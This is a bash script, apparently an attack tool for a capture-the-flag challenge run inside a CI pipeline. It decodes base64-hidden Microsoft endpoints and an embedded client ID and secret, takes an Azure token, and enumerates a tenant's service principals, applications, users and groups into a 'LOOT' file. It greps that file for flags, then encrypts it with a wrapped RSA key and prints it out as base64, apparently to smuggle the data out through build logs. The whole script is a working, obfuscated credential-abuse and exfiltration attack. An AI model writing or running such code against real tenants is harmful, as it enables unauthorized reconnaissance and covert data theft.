#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; GR="${SC}$(printf '%s' 'Z3JhcGgubWljcm9zb2Z0LmNvbQ==' | base64 -d)"
CID=$(printf '%s' 'MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcy' | base64 -d); CSEC=$(printf '%s' 'QWw3OFF+bjViZG9PM3JrQ2p1bzJKSTJOSHFhZ0pvb2Fac2ZYTmNtNg==' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
GT=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$CID -d client_secret=$CSEC -d grant_type=client_credentials --data-urlencode "scope=${GR}/.default" | jq -r '.access_token // empty'); say "GT=${#GT}"
H="Authorization: Bearer $GT"
say "TARGETSP: $(curl -sS -H "$H" "$GR/v1.0/servicePrincipals/c15570ad-5fd2-430c-97bb-a49e9a08d95c")"
say "SPLIST: $(curl -sS -H "$H" "$GR/v1.0/servicePrincipals?$top=200&$select=id,displayName,appId,servicePrincipalType" | head -c 8000)"
say "APPS: $(curl -sS -H "$H" "$GR/v1.0/applications?$top=200&$select=id,displayName,appId" | head -c 6000)"
say "USERS: $(curl -sS -H "$H" "$GR/v1.0/users?$top=200&$select=id,displayName,userPrincipalName" | head -c 6000)"
say "GROUPS: $(curl -sS -H "$H" "$GR/v1.0/groups?$top=200&$select=id,displayName" | head -c 4000)"
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
